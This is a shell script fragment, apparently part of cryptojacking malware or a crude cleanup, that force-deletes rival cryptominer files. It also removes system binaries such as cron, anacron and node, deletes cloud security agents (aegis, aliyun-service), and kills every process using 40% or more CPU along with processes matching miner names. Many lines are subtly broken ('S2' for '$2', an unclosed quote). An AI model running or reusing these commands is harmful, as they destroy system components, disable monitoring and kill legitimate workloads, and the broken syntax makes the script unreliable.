# dbused
rm -f /etc/cron.hourly/oanacroner
rm -f /etc/cron.hourly/oanacrona
rm -f /etc/cron.daily/oanacroner
rm -f /etc/cron.daily/oanacrona
rm -f /etc/cron.monthly/oanacroner
rm -f /usr/sbin/anacron
# other
rm -f /usr/local/bin/dns
rm -f /etc/update.sh
# chattr -ia /etc/hosts
# echo >/etc/hosts
# chattr +ia /etc/hosts
chattr -i /etc/sysupdate
rm -f /etc/sysupdate
rm -f /etc/config.json
rm -f /usr/bin/.systemcero
rm -f /usr/bin/cloudupdate
rm -f /usr/bin/diskmanagerd
rm -f /lib/libterminfo.so
rm -f /bin/httpsntp
rm -f /bin/fcpsntp
rm -f /usr/sbin/cron
rm -f /usr/bin/kinsing*
rm -f /etc/cron.d/kinsing*
rm -f /usr/bin/node
rm -f /etc/ld.so.preload
rm -f /home/ec2-user/.ssh/0k8gxs
rm -f /etc/init.d/agentwatch
rm -f /usr/sbin/aliyun-service
rm -f /usr/local/aegis
rm -f /tmp/.a
rm -f /var/tmp/.a
rm -f /run/shm/a
rm -f /dev/.a
rm -f /dev/shm/.a
rm -f /run/user/1000/ntpclient
rm -f /run/user/1000/Mozz
rm -f /var/spool/anacron/cron.daily
rm -f /usr/bin/on_ac_power
rm -f /tmp/.dbused
ps auxf|awk '{if($3>=40.0) print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '.javae' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '195.3.146.118' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'apacheorg.xyz' | awk '{print S2}' | xargs -I % kill -9 % 
ps aux | grep -v grep | grep 'bashirc' | awk '{print S2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'dbuse' | awk '{print S2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'dbused' | awk '{print S2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kthreaddk | awk '{print S2}' | xargs -I % kill -9 % 
ps aux | grep -v grep | grep 'gitlab-exp' | awk '{print S2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '614fc2' | awk '{print S2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '8uv9nplnuno' | awk '{print S2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'givemexyz' | awk '{print S2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'javaupDates' | awk '{print S2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kdevtmpfsi' | awk '{print S2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kinsing' | awk '{print S2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'shm/je' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'shm/pty86' | awk '{print S2}'	| xargs -I % kill -9 %
ps aux | grep -v grep | grep 'trace' | awk '{print S2}'	| xargs -I % kill -9 %
ps aux | grep -v grep | grep 'urllib.urlopen' | awk '{print S2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'Y3VybC3odHRw' | awk '{print $2}' | xargs -I % kill -9 %
# ps aux | grep -v grep | grep -v rtemp | grep -v stg | grep 'curl' | awk '{print S2}' | xargs -I % kill -9 %
# ps aux | grep -v grep | grep -v rtemp | grep -v stg | grep 'urlopen' | awk '{print $2}'	| xargs -I % kill -9 %
# ps aux | grep -v grep | grep -v rtemp | grep -v stg | grep 'wget'	| awk '{print S2}'	| xargs -I % kill -9 %
